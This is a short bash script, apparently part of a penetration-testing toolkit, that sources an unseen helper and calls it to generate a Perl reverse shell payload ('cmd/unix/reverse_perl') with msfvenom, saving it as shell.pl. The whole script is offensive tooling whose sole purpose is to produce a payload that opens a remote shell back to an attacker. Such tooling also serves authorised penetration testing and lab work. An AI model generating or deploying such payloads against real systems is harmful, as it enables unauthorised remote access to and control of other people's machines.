#!/bin/bash

: '
Create Perl file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

payload="cmd/unix/reverse_perl"
format="raw"
filename="shell.pl"

create_reverse_shell "${payload}" "${format}" "${filename}"